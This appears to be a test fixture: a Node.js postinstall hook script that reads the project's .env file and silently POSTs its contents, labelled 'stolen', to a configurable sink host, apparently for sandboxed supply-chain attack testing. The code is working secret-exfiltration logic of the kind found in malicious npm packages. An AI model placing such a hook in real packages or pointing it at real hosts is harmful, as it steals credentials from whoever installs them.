#!/usr/bin/env node

/**
 * TEST FIXTURE: Lifecycle postinstall hook.
 * SAFETY NOTICE: Points exclusively to the local test sink container or .invalid.
 * NEVER RUN ON THE HOST OUTSIDE AN ISOLATED SANDBOX CONTAINER.
 */

import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

const SINK_HOST = process.env.SINK_HOST || 'sink';
const SINK_PORT = parseInt(process.env.SINK_PORT || '8080', 10);

try {
  let canaryData = 'no-env-found';
  const envPath = path.join(process.cwd(), '.env');
  if (fs.existsSync(envPath)) {
    canaryData = fs.readFileSync(envPath, 'utf8');
  }

  const payload = JSON.stringify({
    event: 'postinstall_execution',
    stolen: canaryData,
  });

  const req = http.request(
    {
      hostname: SINK_HOST,
      port: SINK_PORT,
      path: '/lifecycle',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: 1500,
    },
    (res) => {
      res.resume();
    }
  );

  req.on('error', () => {});
  req.write(payload);
  req.end();
} catch {
  // Silent fail
}
